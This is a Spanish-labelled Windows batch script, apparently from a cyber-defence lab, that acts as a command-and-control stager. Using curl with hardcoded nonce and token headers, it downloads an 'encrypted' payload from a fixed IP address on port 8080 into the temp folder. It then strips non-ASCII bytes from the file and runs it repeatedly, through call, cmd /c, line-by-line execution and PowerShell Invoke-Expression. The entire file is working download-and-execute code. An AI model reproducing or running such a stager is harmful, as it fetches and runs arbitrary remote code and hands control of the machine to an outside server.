@echo off
setlocal EnableDelayedExpansion
chcp 65001 >nul
title C2 DEBUG.MAX - RAW+HEX+EXEC
color 0E

echo.
echo ╔══════════════════════════════════════════════════════╗
echo ║  🕵️‍♂️  C2 VERBOSE.DEBUG - MAX TRANSPARENCY 🕵️‍♂️     ║
echo ║  Alex Montilla - Ciberdefensa Lab vDEBUG              ║
echo ╚══════════════════════════════════════════════════════╝
echo.

set "BASE=http://82.29.153.101:8080"
set "FILE=%TEMP%\sc.bat"
set "RAW=%TEMP%\sc_raw.bin"
set "CLEAN=%TEMP%\sc_clean.bat"
set "LOG=%TEMP%\c2_debug.log"

echo 📁 DEBUG FILES:
echo    RAW:    %RAW%
echo    CLEAN:  %CLEAN%
echo    EXEC:   %FILE%
echo    LOG:    %LOG%
echo.

echo =====================================================
echo 🔍 [1/7] DOWNLOAD RAW PAYLOAD
echo =====================================================
curl -s --max-time 10 ^
  -H "X-Nonce: c24006585e29ee17c78d58df7108c7e4" ^
  -H "X-Token: 36919b505fb7bb557ff2516fdefce529b66b869b8034" ^
  "%BASE%/payload/encrypted" > "%RAW%"

echo ✓ RAW SIZE:
for %%F in ("%RAW%") do echo    %%~zF bytes

echo.
echo =====================================================
echo 🔍 [2/7] HEX DUMP - PRIMEROS 64 BYTES
echo =====================================================
powershell -NoProfile -Command ^
  "$bytes=[System.IO.File]::ReadAllBytes('%RAW%'); ^
  0..63 | ForEach-Object { if($_ -lt $bytes.Length) { '{0:X2} ' -f $bytes[$_] } else { '..' } } | ^
  Out-Host -Width 100"

echo.
echo =====================================================
echo 🔍 [3/7] ASCII DUMP - CONTENIDO LEGIBLE
echo =====================================================
powershell -NoProfile -Command ^
  "$bytes=[System.IO.File]::ReadAllBytes('%RAW%'); ^
  $text = $bytes | Where-Object {$_ -ge 32 -and $_ -le 126} | ForEach-Object {[char]$_}; ^
  [System.Text.Encoding]::ASCII.GetString($text.ToArray())"

echo.
echo =====================================================
echo 🧹 [4/7] LIMPIEZA AUTOMÁTICA (BOM + INVISIBLES)
echo =====================================================
powershell -NoProfile -Command ^
  "$bytes = [System.IO.File]::ReadAllBytes('%RAW%'); ^
  # Skip BOM (FF FE, EF BB BF, etc) ^
  $start = 0; ^
  if($bytes[0] -eq 0xFF -and $bytes[1] -eq 0xFE) { $start = 2 }; ^
  if($bytes[0] -eq 0xEF -and $bytes[1] -eq 0xBB -and $bytes[2] -eq 0xBF) { $start = 3 }; ^
  # Clean visible ASCII only ^
  $cleanBytes = $bytes[$start..($bytes.Length-1)] | Where-Object { $_ -ge 32 -and $_ -le 126 }; ^
  [System.Text.Encoding]::ASCII.GetString($cleanBytes) | Out-File '%CLEAN%' -Encoding ASCII; ^
  Write-Host '✓ CLEAN SIZE:' ([System.IO.File]::ReadAllText('%CLEAN%').Length) 'chars'"

echo.
echo =====================================================
echo 📄 [5/7] CONTENIDO FINAL LIMPIO
echo =====================================================
echo CONTENIDO %CLEAN%:
type "%CLEAN%"
echo.

echo =====================================================
echo 🚀 [6/7] EJECUCIÓN MÚLTIPLE + SALIDA GARANTIZADA
echo =====================================================

echo 🔥 TEST 1: call directo
echo --- SALIDA DIRECTA ---
call "%CLEAN%" 
echo --- FIN TEST 1 ---

echo 🔥 TEST 2: cmd /c con log
cmd /c "%CLEAN%" > "%LOG%" 2>&1
echo --- SALIDA LOG ---
type "%LOG%"
echo --- FIN TEST 2 ---

echo 🔥 TEST 3: línea por línea
echo --- LÍNEA POR LÍNEA ---
for /f "usebackq delims=" %%L in ("%CLEAN%") do (
    echo EJEC >> "%LOG%"
    echo "%%L" >> "%LOG%"
    %%L >> "%LOG%" 2>&1
)
type "%LOG%"
echo --- FIN TEST 3 ---

echo 🔥 TEST 4: PowerShell ejecución
powershell -NoProfile -Command "Get-Content '%CLEAN%' | ForEach-Object { Write-Host 'EXEC: $_'; Invoke-Expression $_ 2>&1 }"

echo.
echo =====================================================
echo ✅ [7/7] RESUMEN FINAL
echo =====================================================
echo RAW SIZE: 
for %%F in ("%RAW%") do echo    %%~zF bytes
echo CLEAN SIZE: 
for %%F in ("%CLEAN%") do echo    %%~zF bytes
echo LOG: %LOG%
echo.

echo 🔥 PRESIONA CUALQUIER TECLA PARA VER TODO OTRA VEZ
pause >nul

REM RE-EJECUTAR PARA CONFIRMAR
echo 🔥 REPLAY EXEC...
call "%CLEAN%"
pause